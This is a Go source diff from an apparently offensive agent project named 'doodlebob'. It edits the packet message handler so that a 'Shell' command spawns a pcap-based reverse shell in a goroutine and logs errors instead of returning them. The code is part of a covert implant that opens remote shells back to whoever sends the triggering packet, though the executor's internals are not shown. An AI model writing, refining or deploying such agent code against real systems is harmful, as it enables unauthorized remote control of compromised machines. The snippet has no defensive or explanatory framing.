@@ -5,13 +5,14 @@ package agent
 import (
 	"context"
 	"fmt"
+	"log"
 	"net"
 	"strconv"
 	"time"
 
 	"github.com/MeHungr/doodlebob/internal/message"
-	"github.com/MeHungr/doodlebob/pkg/network"
 	"github.com/MeHungr/doodlebob/pkg/executor"
+	"github.com/MeHungr/doodlebob/pkg/network"
 	"github.com/google/gopacket/layers"
 )
 
@@ -87,19 +88,12 @@ func handleMessage(msg *message.Message) error {
 			}()
 		// Opens a reverse shell on port specified in packet
 		case message.Shell:
-			errChan := make(chan error, 1)
-			go func(ip, port string) {
+			go func() {
 				if err := executor.OpenPcapReverseShell(msg); err != nil {
-					errChan <- fmt.Errorf("opening reverse shell: %w", err)
-					return
+					log.Printf("opening reverse shell to %s:%s: %v", msg.SrcIP, msg.SrcPort, err)
 				}
-			}(msg.SrcIP, msg.SrcPort)
-			select {
-			case err := <-errChan:
-				return fmt.Errorf("handling reverse shell: %w", err)
-			default:
-				return nil
-			}
+			}()
+			return nil
 		}
 	default:
 		return nil
